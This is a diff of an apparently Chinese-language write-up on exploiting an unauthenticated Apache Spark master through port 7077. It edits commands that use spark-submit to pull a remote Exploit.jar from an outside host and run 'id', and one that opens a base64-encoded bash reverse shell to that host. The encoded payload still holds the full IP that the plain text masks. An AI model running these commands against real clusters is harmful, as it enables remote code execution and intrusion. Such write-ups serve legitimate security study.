@@ -54,20 +54,20 @@ http://192.168.202.128:8081/logPage/?driverId=driver-20211014035556-0013&logType
 
 通过端口7077执行命令  
 ```
-./spark-submit --master spark://192.168.202.128:7077 --deploy-mode cluster --class Exploit http://101.200.144.55:8000/Exploit.jar id
+./spark-submit --master spark://192.168.202.128:7077 --deploy-mode cluster --class Exploit http://101.200.xx.xx:8000/Exploit.jar id
 ```
 spark-submit下载链接：https://archive.apache.org/dist/spark/spark-2.4.3/spark-2.4.3-bin-hadoop2.7.tgz  
 还是上述查看方式，成功执行命令  
 
 通过端口7077反弹shell  
 ```
-./spark-submit --master spark://192.168.202.128:7077 --deploy-mode cluster --class Exploit http://101.200.144.55:8000/Exploit.jar "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuMjAwLjE0NC41NS84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}"
+./spark-submit --master spark://192.168.202.128:7077 --deploy-mode cluster --class Exploit http://101.200.xx.xx:8000/Exploit.jar "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuMjAwLjE0NC41NS84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}"
 ```
 其中的
 ```
 bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuMjAwLjE0NC41NS84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}
 为
-bash -i >& /dev/tcp/101.200.144.55/8888 0>&1
+bash -i >& /dev/tcp/101.200.xx.xx/8888 0>&1
 经过如下网站编码
 http://www.jackson-t.ca/runtime-exec-payloads.html
 ```
